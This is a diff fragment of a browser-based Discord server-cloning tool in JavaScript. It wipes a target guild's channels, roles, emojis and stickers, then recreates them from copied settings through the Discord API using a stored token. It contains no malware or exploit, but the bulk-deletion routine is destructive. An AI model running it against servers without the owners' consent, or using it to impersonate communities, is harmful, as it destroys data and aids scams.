+                    ctx.drawImage(img, 0, 0, size, size);
+                    canvas.toBlob(blob => {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onload = () => resolve(reader.result);
+                        reader.onerror = reject;
+                    }, maxSize === 'emoji' ? 'image/png' : 'image/png', 0.9);
+                };
+                img.onerror = () => reject(new Error(`Failed to load image: ${url}`));
+            });
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const [header, data] = dataURL.split(',');
+            const mime = header.match(/:(.*?);/)[1];
+            const binary = atob(data);
+            const array = new Uint8Array(binary.length);
+            for (let i = 0; i < binary.length; i++) {
+                array[i] = binary.charCodeAt(i);
+            }
+            return new Blob([array], { type: mime });
+        }
+
+        async function processBatch(items, operation, guildId, newRoleIds, categoryMap, channelMap, logPasting, updateProgress, batchSize, batchDelay, type, extraParams = {}) {
+            const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+            const batches = [];
+            const existingNames = new Set();
+            for (let i = 0; i < items.length; i += batchSize) {
+                batches.push(items.slice(i, i + batchSize));
+            }
+            let rulesChannelId = null;
+            for (const batch of batches) {
+                if (!isPasting) throw new Error('Pasting canceled');
+                const promises = batch.map((item, index) => {
+                    if (type === 'channel' && operation === 'delete') {
+                        return fetchDiscord(`/channels/${item.id}`, token, 'DELETE')
+                            .then(() => {
+                                logPasting(`Deleted ${item.type === 4 ? 'category' : 'channel'} ${item.name} (ID: ${item.id}, Position: ${item.position})`, 'success');
+                                updateProgress();
+                            })
+                            .catch(err => logPasting(`Failed to delete ${item.type === 4 ? 'category' : 'channel'} ${item.name} (ID: ${item.id}, Position: ${item.position}): ${err.message}`, 'error'));
+                    } else if (type === 'channel' && operation === 'create') {
+                        const validPerms = (item.permission_overwrites || []).filter(perm => newRoleIds[perm.id] || perm.type !== 0);
+                        if (validPerms.length < (item.permission_overwrites || []).length) {
+                            logPasting(`Warning: Skipped invalid permissions for ${item.type === 4 ? 'category' : 'channel'} ${item.name} (ID: ${item.id}, Position: ${item.position})`, 'warning');
+                        }
+                        return fetchDiscord(`/guilds/${guildId}/channels`, token, 'POST', {
+                            name: item.name.slice(0, 100),
+                            type: item.type,
+                            parent_id: item.type !== 4 && item.parent_id ? categoryMap[item.parent_id] : null,
+                            permission_overwrites: validPerms.map(perm => ({
+                                id: newRoleIds[perm.id] || perm.id,
+                                type: perm.type,
+                                allow: perm.allow || '0',
+                                deny: perm.deny || '0'
+                            })),
+                            position: item.position
+                        })
+                        .then(newChannel => {
+                            if (newChannel && newChannel.id) {
+                                channelMap[item.id] = newChannel.id;
+                                logPasting(`Created ${item.type === 4 ? 'category' : 'channel'} ${item.name} (ID: ${newChannel.id}, Position: ${item.position}, Parent: ${item.parent_id ? categoryMap[item.parent_id] || 'None' : 'None'})`, 'success');
+                                if (item.name.toLowerCase().includes('rules')) {
+                                    rulesChannelId = newChannel.id;
+                                }
+                                updateProgress();
+                            } else {
+                                logPasting(`Failed to create ${item.type === 4 ? 'category' : 'channel'} ${item.name}: No ID returned`, 'error');
+                            }
+                            return newChannel;
+                        })
+                        .catch(err => logPasting(`Failed to create ${item.type === 4 ? 'category' : 'channel'} ${item.name} (ID: ${item.id}, Position: ${item.position}): ${err.message}`, 'error'));
+                    } else if (type === 'role' && operation === 'delete') {
+                        return fetchDiscord(`/guilds/${guildId}/roles/${item.id}`, token, 'DELETE')
+                            .then(() => {
+                                logPasting(`Deleted role ${item.name} (ID: ${item.id}, Position: ${item.position})`, 'success');
+                                updateProgress();
+                            })
+                            .catch(err => logPasting(`Failed to delete role ${item.name} (ID: ${item.id}, Position: ${item.position}): ${err.message}`, 'error'));
+                    } else if (type === 'role' && operation === 'create') {
+                        const roleName = sanitizeRoleName(item.name, extraParams.roleIndex + index, existingNames);
+                        const permissions = String(item.permissions || '0');
+                        const color = Math.floor(Number(item.color) || 0);
+                        if (color < 0 || color > 16777215) {
+                            logPasting(`Warning: Invalid color ${item.color} for role ${roleName}, using 0`, 'warning');
+                        }
+                        return fetchDiscord(`/guilds/${guildId}/roles`, token, 'POST', {
+                            name: roleName,
+                            permissions: permissions,
+                            color: color >= 0 && color <= 16777215 ? color : 0,
+                            hoist: item.hoist || false,
+                            mentionable: item.mentionable || false,
+                            position: item.position
+                        })
+                        .then(newRole => {
+                            if (newRole && newRole.id) {
+                                newRoleIds[item.id] = newRole.id;
+                                logPasting(`Created role ${roleName} (ID: ${newRole.id}, Position: ${item.position}, Color: #${(color || 0).toString(16).padStart(6, '0')})`, 'success');
+                            } else {
+                                logPasting(`Failed to create role ${roleName}: No ID returned`, 'error');
+                            }
+                            updateProgress();
+                        })
+                        .catch(err => logPasting(`Failed to create role ${roleName}: ${err.message}`, 'error'));
+                    } else if (type === 'emoji' && operation === 'delete') {
+                        return fetchDiscord(`/guilds/${guildId}/emojis/${item.id}`, token, 'DELETE')
+                            .then(() => {
+                                logPasting(`Deleted emoji ${item.name} (ID: ${item.id})`, 'success');
+                                updateProgress();
+                            })
+                            .catch(err => logPasting(`Failed to delete emoji ${item.name} (ID: ${item.id}): ${err.message}`, 'error'));
+                    } else if (type === 'emoji' && operation === 'create') {
+                        return extraParams.getImageData(item, 'emoji').then(imageData => {
+                            return fetchDiscord(`/guilds/${guildId}/emojis`, token, 'POST', {
+                                name: item.name.slice(0, 32),
+                                image: imageData
+                            })
+                            .then(() => {
+                                logPasting(`Created emoji ${item.name} (ID: ${item.id})`, 'success');
+                                updateProgress();
+                            })
+                            .catch(err => logPasting(`Failed to create emoji ${item.name} (ID: ${item.id}): ${err.message}`, 'error'));
+                        }).catch(err => logPasting(`Failed to process emoji ${item.name} (ID: ${item.id}): ${err.message}`, 'error'));
+                    } else if (type === 'sticker' && operation === 'delete') {
+                        return fetchDiscord(`/guilds/${guildId}/stickers/${item.id}`, token, 'DELETE')
+                            .then(() => {
+                                logPasting(`Deleted sticker ${item.name} (ID: ${item.id})`, 'success');
+                                updateProgress();
+                            })
+                            .catch(err => logPasting(`Failed to delete sticker ${item.name} (ID: ${item.id}): ${err.message}`, 'error'));
+                    } else if (type === 'sticker' && operation === 'create') {
+                        return extraParams.getImageData(item, 'sticker').then(imageData => {
+                            const formData = new FormData();
+                            formData.append('name', item.name.slice(0, 30));
+                            formData.append('description', (item.description || '').slice(0, 100));
+                            formData.append('tags', (item.tags || '').slice(0, 200));
+                            formData.append('file', dataURLtoBlob(imageData), `${item.name}.png`);
+                            return fetchDiscord(`/guilds/${guildId}/stickers`, token, 'POST', formData, 5, true)
+                            .then(() => {
+                                logPasting(`Created sticker ${item.name} (ID: ${item.id})`, 'success');
+                                updateProgress();
+                            })
+                            .catch(err => logPasting(`Failed to create sticker ${item.name} (ID: ${item.id}): ${err.message}`, 'error'));
+                        }).catch(err => logPasting(`Failed to process sticker ${item.name} (ID: ${item.id}): ${err.message}`, 'error'));
+                    } else if (type === 'settings' && operation === 'delete') {
+                        return extraParams.action(item)
+                            .then(() => {
+                                logPasting(`Reset ${item.type}`, 'success');
+                                updateProgress();
+                            })
+                            .catch(err => logPasting(`Failed to reset ${item.type}: ${err.message}`, 'error'));
+                    } else if (type === 'settings' && operation === 'create') {
+                        return extraParams.action(item)
+                            .then(() => {
+                                logPasting(`Updated ${item.type}`, 'success');
+                                updateProgress();
+                            })
+                            .catch(err => logPasting(`Failed to update ${item.type}: ${err.message}`, 'error'));
+                    } else if (type === 'onboarding' && operation === 'create') {
+                        return extraParams.action(item)
+                            .then(() => {
+                                logPasting(`Updated onboarding ${item.type}`, 'success');
+                                updateProgress();
+                            })
+                            .catch(err => logPasting(`Failed to update onboarding ${item.type}: ${err.message}`, 'error'));
+                    }
+                });
+                await Promise.all(promises);
+                await sleep(batchDelay);
+                if (type === 'channel' && operation === 'create' && items[0]?.type === 4) {
+                    promises.forEach((promise, index) => {
+                        promise.then(result => {
+                            if (result && result.id) {
+                                categoryMap[batch[index].id] = result.id;
+                            }
+                        });
+                    });
+                }
+            }
+            return rulesChannelId;
+        }
+
+        async function getImageData(item, type) {
+            const url = type === 'emoji' 
+                ? `https://cdn.discordapp.com/emojis/${item.id}.${item.animated ? 'gif' : 'png'}`
+                : `https://cdn.discordapp.com/stickers/${item.id}.png`;
+            try {
+                const response = await fetch(url, { method: 'HEAD' });
+                if (!response.ok) {
+                    throw new Error(`Image inaccessible: ${response.status}`);
+                }
+                return await resizeImage(url, type);
+            } catch (error) {
+                throw new Error(`Failed to access image for ${type} ${item.name}: ${error.message}`);
+            }
+        }
+
+        window.pasteGuild = async function(guildId) {
+            if (!copiedSettings || selectedPasteOption === 'none') {
+                showStatus('No settings copied or no paste option selected.', 'error');
+                return;
+            }
+            if (isPasting) {
+                showStatus('Pasting already in progress.', 'error');
+                return;
+            }
+            if (selectedPasteOption === 'template') {
+                showStatus('Generating server template...', 'warning');
+                document.getElementById('pastingLog').classList.remove('hidden');
+                document.getElementById('pastingLog').innerHTML = '';
+                document.getElementById('preview').classList.remove('hidden');
+                document.getElementById('progressBar').classList.remove('hidden');
+                document.getElementById('progressText').classList.remove('hidden');
+
+                let totalSteps = 1;
+                let currentStep = 0;
+
+                function updateProgress() {
+                    currentStep++;
+                    const percent = totalSteps ? (currentStep / totalSteps) * 100 : 0;
+                    document.getElementById('progressFill').style.width = `${percent}%`;
+                    document.getElementById('progressText').textContent = `Progress: ${Math.round(percent)}% (${currentStep}/${totalSteps})`;
+                }
+
+                function logPasting(message, type) {
+                    const log = document.getElementById('pastingLog');
+                    log.innerHTML += `<p class="${type}">[${new Date().toLocaleTimeString()}] ${message}</p>`;
+                    log.scrollTop = log.scrollHeight;
+                }
+
+                try {
+                    const { isOwner, hasAdmin } = await checkAdminPermissions(guildId);
+                    if (!isOwner && !hasAdmin) {
+                        throw new Error('You need admin permissions (MANAGE_GUILD) or ownership to create a template.');
+                    }
+                    const existingTemplates = await fetchDiscord(`/guilds/${guildId}/templates`, token);
+                    let template;
+                    if (existingTemplates.length > 0) {
+                        template = existingTemplates[0];
+                        logPasting(`Found existing template: ${template.name} (${template.code})`, 'warning');
+                    } else {
+                        const channelCount = copiedSettings.channels.length;
+                        const roleCount = copiedSettings.roles.length;
+                        if (channelCount > 1000) {
+                            throw new Error(`Cannot create template: ${channelCount} channel permission overwrites exceed 1000 limit.`);
+                        }
+                        template = await fetchDiscord(`/guilds/${guildId}/templates`, token, 'POST', {
+                            name: `${copiedSettings.guild.name || 'Server'} Template`,
+                            description: `Template for ${copiedSettings.guild.name || 'server'} with ${roleCount} roles and ${channelCount} channels`
+                        });
+                        logPasting(`Created template: ${template.name} (${template.code})`, 'success');
+                    }
+                    const templateLink = `https://discord.com/template/${template.code}`;
+                    document.getElementById('preview').innerHTML = `
+                        <h3>Server Template</h3>
+                        <p><strong>Name:</strong> ${template.name}</p>
+                        <p><strong>Description:</strong> ${template.description}</p>
+                        <p><strong>Link:</strong> <a class="templateLink" href="${templateLink}" target="_blank">${templateLink}</a> <button onclick="navigator.clipboard.writeText('${templateLink}')">Copy Link</button></p>
+                        <p><strong>Roles:</strong> ${copiedSettings.roles.length}</p>
+                        <p><strong>Channels:</strong> ${copiedSettings.channels.length}</p>
+                    `;
+                    updateProgress();
+                    isPasting = false;
+                    document.getElementById('stopButton').classList.add('hidden');
+                    document.getElementById('progressBar').classList.add('hidden');
+                    document.getElementById('progressText').classList.add('hidden');
+                    showStatus(`Successfully generated template: ${templateLink}`, 'success');
+                } catch (error) {
+                    logPasting(`Failed to generate template: ${error.message}`, 'error');
+                    isPasting = false;
+                    document.getElementById('stopButton').classList.add('hidden');
+                    document.getElementById('progressBar').classList.add('hidden');
+                    document.getElementById('progressText').classList.add('hidden');
+                    showStatus(`Failed to generate template: ${error.message}`, 'error');
+                }
+                return;
+            }
+
+            isPasting = true;
+            document.getElementById('stopButton').classList.remove('hidden');
+            document.getElementById('preview').classList.remove('hidden');
+            document.getElementById('pastingLog').classList.remove('hidden');
+            showStatus('Checking permissions...', 'warning');
+            const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+            try {
+                const { isOwner, hasAdmin, hasManageEmojis, hasManageChannels } = await checkAdminPermissions(guildId);
+                if (!isOwner && !hasAdmin && ['all', 'settings', 'roles', 'onboarding'].includes(selectedPasteOption)) {
+                    throw new Error(`You need admin permissions (MANAGE_GUILD) or ownership to paste ${selectedPasteOption}.`);
+                }
+                if (['emojis', 'stickers'].includes(selectedPasteOption) && !hasManageEmojis) {
+                    throw new Error(`You need MANAGE_EMOJIS_AND_STICKERS permission to paste ${selectedPasteOption}.`);
+                }
+                if (['channels'].includes(selectedPasteOption) && !hasManageChannels) {
+                    throw new Error('You need MANAGE_CHANNELS permission to paste channels.');
+                }
+
+                showStatus(`Pasting ${selectedPasteOption}...`, 'warning');
+                document.getElementById('progressBar').classList.remove('hidden');
+                document.getElementById('progressText').classList.remove('hidden');
+                document.getElementById('pastingLog').innerHTML = '';
+
+                const { guild, channels, roles, emojis, stickers, onboarding } = copiedSettings;
+                let seconds = parseFloat(document.getElementById('batchSeconds')?.value) || 6.5;
+                let items = parseInt(document.getElementById('batchItems')?.value) || 1;
+
+                let delay = MIN_OTHER_DELAY_MS;
+                let batchSize = items;
+                if (selectedPasteOption === 'roles') delay = Math.max(MIN_ROLE_DELAY_MS, (seconds * 1000) / items);
+                else if (selectedPasteOption === 'channels') {
+                    delay = Math.max(MIN_CHANNEL_DELAY_MS, (seconds * 1000) / items);
+                    batchSize = Math.min(items, 100);
+                } else delay = Math.max(MIN_OTHER_DELAY_MS, (seconds * 1000) / items);
+
+                let totalSteps = 0;
+                let existingChannels = [], existingRoles = [], existingEmojis = [], existingStickers = [];
+                if (['all', 'settings'].includes(selectedPasteOption)) totalSteps += (guild.name ? 1 : 0) + (guild.icon ? 1 : 0);
+                if (['all', 'roles', 'onboarding'].includes(selectedPasteOption)) {
+                    existingRoles = await fetchDiscord(`/guilds/${guildId}/roles`, token);
+                    totalSteps += existingRoles.filter(r => r.name !== '@everyone' && !r.managed).length + roles.length;
+                }
+                if (['all', 'emojis'].includes(selectedPasteOption)) {
+                    existingEmojis = await fetchDiscord(`/guilds/${guildId}/emojis`, token);
+                    totalSteps += existingEmojis.length + emojis.length;
+                }
+                if (['all', 'stickers'].includes(selectedPasteOption)) {
+                    existingStickers = await fetchDiscord(`/guilds/${guildId}/stickers`, token);
+                    totalSteps += existingStickers.length + stickers.length;
+                }
+                if (['all', 'channels', 'onboarding'].includes(selectedPasteOption)) {
+                    existingChannels = await fetchDiscord(`/guilds/${guildId}/channels`, token);
+                    totalSteps += existingChannels.length + channels.length;
+                }
+                if (['all', 'onboarding'].includes(selectedPasteOption)) totalSteps += (onboarding?.prompts?.length || 0) + (onboarding?.welcomeScreen ? 1 : 0);
+                if (['settings', 'roles', 'emojis', 'stickers', 'channels', 'onboarding'].includes(selectedPasteOption)) {
+                    totalSteps += existingChannels.length + existingRoles.filter(r => r.name !== '@everyone' && !r.managed).length + existingEmojis.length + existingStickers.length + (onboarding ? 1 : 0);
+                }
+
+                let currentStep = 0;
+
+                function updateProgress() {
+                    currentStep++;
+                    const percent = totalSteps ? Math.min((currentStep / totalSteps) * 100, 100) : 0;
+                    document.getElementById('progressFill').style.width = `${percent}%`;
+                    document.getElementById('progressText').textContent = `Progress: ${Math.round(percent)}% (${currentStep}/${totalSteps})`;
+                }
+
+                function logPasting(message, type) {
+                    const log = document.getElementById('pastingLog');
+                    log.innerHTML += `<p class="${type}">[${new Date().toLocaleTimeString()}] ${message}</p>`;
+                    log.scrollTop = log.scrollHeight;
+                }
+
+                showStatus('Deleting existing content...', 'warning');
+                if (['all', 'settings', 'roles', 'emojis', 'stickers', 'channels', 'onboarding'].includes(selectedPasteOption)) {
+                    existingChannels = existingChannels.length ? existingChannels : await fetchDiscord(`/guilds/${guildId}/channels`, token);
+                    await processBatch(existingChannels, 'delete', guildId, {}, {}, {}, logPasting, updateProgress, batchSize, MIN_CHANNEL_DELAY_MS, 'channel');
+
+                    existingRoles = existingRoles.length ? existingRoles : await fetchDiscord(`/guilds/${guildId}/roles`, token);
+                    await processBatch(existingRoles.filter(r => r.name !== '@everyone' && !r.managed), 'delete', guildId, {}, {}, {}, logPasting, updateProgress, batchSize, MIN_ROLE_DELAY_MS, 'role');
+
+                    existingEmojis = existingEmojis.length ? existingEmojis : await fetchDiscord(`/guilds/${guildId}/emojis`, token);
+                    await processBatch(existingEmojis, 'delete', guildId, {}, {}, {}, logPasting, updateProgress, batchSize, delay, 'emoji');
+
+                    existingStickers = existingStickers.length ? existingStickers : await fetchDiscord(`/guilds/${guildId}/stickers`, token);
+                    await processBatch(existingStickers, 'delete', guildId, {}, {}, {}, logPasting, updateProgress, batchSize, delay, 'sticker');
+
+                    if (onboarding) {
+                        try {
+                            await fetchDiscord(`/guilds/${guildId}/onboarding`, token, 'PUT', { enabled: false });
+                            updateProgress();
+                            logPasting(`Disabled onboarding`, 'success');
+                        } catch (err) {
+                            logPasting(`Failed to disable onboarding: ${err.message}`, 'error');
+                        }
+                        await sleep(delay);
+                    }
+                }
+
+                if (['all', 'roles', 'onboarding'].includes(selectedPasteOption)) {
+                    const existingRoles = await fetchDiscord(`/guilds/${guildId}/roles`, token);
+                    if (existingRoles.length >= MAX_ROLES) {
+                        showStatus(`Error: Server has ${existingRoles.length} roles, at maximum limit (${MAX_ROLES}).`, 'error');
+                        throw new Error('Role limit exceeded');
+                    }
+                    if (existingRoles.length + roles.length > MAX_ROLES) {
+                        showStatus(`Error: Cannot create ${roles.length} roles; server would exceed ${MAX_ROLES} role limit (current: ${existingRoles.length}).`, 'error');
+                        throw new Error('Role limit exceeded');
+                    }
+                }
+
+                if (['all', 'settings'].includes(selectedPasteOption)) {
+                    showStatus('Resetting server settings...', 'warning');
+                    const settingsItems = [];
+                    if (guild.name) settingsItems.push({ type: 'name', name: 'Temporary Server' });
+                    if (guild.icon) settingsItems.push({ type: 'icon', icon: null });
+                    await processBatch(settingsItems, 'delete', guildId, {}, {}, {}, logPasting, updateProgress, batchSize, delay, 'settings', {
+                        action: item => fetchDiscord(`/guilds/${guildId}`, token, 'PATCH', { [item.type]: item[item.type] })
+                    });
+                }
+
+                if (['all', 'settings'].includes(selectedPasteOption) && guild.name) {
+                    showStatus('Updating server name...', 'warning');
+                    await processBatch([{ type: 'name', name: guild.name.slice(0, 100) }], 'create', guildId, {}, {}, {}, logPasting, updateProgress, batchSize, delay, 'settings', {
+                        action: item => fetchDiscord(`/guilds/${guildId}`, token, 'PATCH', { name: item.name })
+                    });
+                }
+
+                if (['all', 'settings'].includes(selectedPasteOption) && guild.icon) {
+                    showStatus('Updating server icon...', 'warning');
+                    await processBatch([{ type: 'icon', id: guild.id, icon: guild.icon }], 'create', guildId, {}, {}, {}, logPasting, updateProgress, batchSize, delay, 'settings', {
+                        action: async item => {
+                            const iconUrl = `https://cdn.discordapp.com/icons/${item.id}/${item.icon}.png`;
+                            try {
+                                const iconData = await resizeImage(iconUrl, 'icon');
+                                return fetchDiscord(`/guilds/${guildId}`, token, 'PATCH', { icon: iconData });
+                            } catch (error) {
+                                logPasting(`Failed to process server icon: ${error.message}`, 'error');
+                                throw error;
+                            }
+                        }
+                    });
+                }
+
+                const newRoleIds = {};
+                if (['all', 'roles', 'onboarding'].includes(selectedPasteOption)) {
+                    showStatus('Creating roles...', 'warning');
+                    const existingRoles = await fetchDiscord(`/guilds/${guildId}/roles`, token);
+                    await processBatch(roles, 'create', guildId, newRoleIds, {}, {}, logPasting, updateProgress, batchSize, MIN_ROLE_DELAY_MS, 'role', { roleIndex: existingRoles.length });
+                }
+
+                const channelMap = {};
+                let rulesChannelId = null;
+                if (['all', 'channels', 'onboarding'].includes(selectedPasteOption)) {
+                    showStatus('Creating channels/categories...', 'warning');
+                    const categoryMap = {};
+                    const categories = channels.filter(c => c.type === 4);
+                    await processBatch(categories, 'create', guildId, newRoleIds, categoryMap, channelMap, logPasting, updateProgress, batchSize, MIN_CHANNEL_DELAY_MS, 'channel');
+
+                    const nonCategoryChannels = channels.filter(c => c.type !== 4);
+                    rulesChannelId = await processBatch(nonCategoryChannels, 'create', guildId, newRoleIds, categoryMap, channelMap, logPasting, updateProgress, batchSize, MIN_CHANNEL_DELAY_MS, 'channel');
+                }
+
+                if (rulesChannelId && ['all', 'channels'].includes(selectedPasteOption)) {
+                    if (!isPasting) throw new Error('Pasting canceled');
+                    try {
+                        const rulesMessage = 'Server Rules: Follow Discord ToS, be respectful, no spam.';
+                        await fetchDiscord(`/channels/${rulesChannelId}/messages`, token, 'POST', {
+                            content: rulesMessage
+                        });
+                        updateProgress();
+                        logPasting(`Posted rules in rules channel (ID: ${rulesChannelId})`, 'success');
+                    } catch (err) {
+                        logPasting(`Failed to post rules in rules channel (ID: ${rulesChannelId}): ${err.message}`, 'error');
+                    }
+                    await sleep(delay);
+                }
+
+                if (['all', 'emojis'].includes(selectedPasteOption)) {
+                    showStatus('Creating emojis...', 'warning');
+                    await processBatch(emojis, 'create', guildId, newRoleIds, {}, {}, logPasting, updateProgress, batchSize, delay, 'emoji', {
+                        getImageData: getImageData
+                    });
+                }
+
+                if (['all', 'stickers'].includes(selectedPasteOption)) {
+                    showStatus('Creating stickers...', 'warning');
+                    await processBatch(stickers, 'create', guildId, newRoleIds, {}, {}, logPasting, updateProgress, batchSize, delay, 'sticker', {
+                        getImageData: getImageData
+                    });
+                }
+
+                if (['all', 'onboarding'].includes(selectedPasteOption) && onboarding?.onboarding) {
+                    showStatus('Enabling onboarding...', 'warning');
+                    const validPrompts = onboarding.onboarding.prompts?.map(p => ({
+                        id: p.id,
+                        title: p.title?.slice(0, 45),
+                        options: p.options?.map(o => ({
+                            id: o.id,
+                            title: o.title?.slice(0, 100),
+                            description: o.description?.slice(0, 100),
+                            channel_ids: (o.channel_ids || []).filter(id => channelMap[id]).map(id => channelMap[id]),
+                            role_ids: (o.role_ids || []).filter(id => newRoleIds[id]).map(id => newRoleIds[id])
+                        })).filter(o => o.role_ids.length > 0 || o.channel_ids.length > 0),
+                        required: p.required,
+                        single_select: p.single_select,
+                        type: p.type
+                    })).filter(p => p.options?.length > 0) || [];
+                    if (validPrompts.length === 0) {
+                        logPasting('No valid onboarding prompts with existing role_ids or channel_ids', 'warning');
+                    } else {
+                        await processBatch([{ type: 'prompts', prompts: validPrompts, default_channel_ids: onboarding.onboarding.default_channel_ids?.filter(id => channelMap[id]).map(id => channelMap[id]) || [], enabled: onboarding.onboarding.enabled }], 'create', guildId, newRoleIds, {}, channelMap, logPasting, updateProgress, 1, delay, 'onboarding', {
+                            action: item => fetchDiscord(`/guilds/${guildId}/onboarding`, token, 'PUT', {
+                                enabled: item.enabled,
+                                prompts: item.prompts,
+                                default_channel_ids: item.default_channel_ids
+                            })
+                        });
+                    }
+                }
+
+                if (['all', 'onboarding'].includes(selectedPasteOption) && onboarding?.welcomeScreen) {
+                    showStatus('Setting up Server Guide...', 'warning');
+                    const validWelcomeChannels = onboarding.welcomeScreen.welcome_channels?.map(c => ({
+                        channel_id: channelMap[c.channel_id] || c.channel_id,
+                        description: c.description?.slice(0, 100),
+                        emoji_id: c.emoji_id,
+                        emoji_name: c.emoji_name
+                    })).filter(c => c.channel_id) || [];
+                    await processBatch([{ type: 'welcomeScreen', description: onboarding.welcomeScreen.description?.slice(0, 100), welcome_channels: validWelcomeChannels }], 'create', guildId, newRoleIds, {}, channelMap, logPasting, updateProgress, 1, delay, 'onboarding', {
+                        action: item => fetchDiscord(`/guilds/${guildId}/welcome-screen`, token, 'PATCH', {
+                            enabled: true,
+                            description: item.description,
+                            welcome_channels: item.welcome_channels
+                        })
+                    });
+                }
+
+                isPasting = false;
+                document.getElementById('stopButton').classList.add('hidden');
+                document.getElementById('progressBar').classList.add('hidden');
+                document.getElementById('progressText').classList.add('hidden');
+                showStatus(`Successfully pasted ${selectedPasteOption}.`, 'success');
+            } catch (error) {
+                isPasting = false;
+                document.getElementById('stopButton').classList.add('hidden');
+                document.getElementById('progressBar').classList.add('hidden');
+                document.getElementById('progressText').classList.add('hidden');
+                showStatus(`Failed to paste ${selectedPasteOption}: ${error.message || 'API error'}`, 'error');
+            }
+        };
+
+        window.stopPasting = function() {
+            isPasting = false;
+            document.getElementById('stopButton').classList.add('hidden');
+            document.getElementById('progressBar').classList.add('hidden');
+            document.getElementById('progressText').classList.add('hidden');
+            showStatus('Pasting stopped.', 'warning');
+        };
+    </script>
+</body>
+</html>
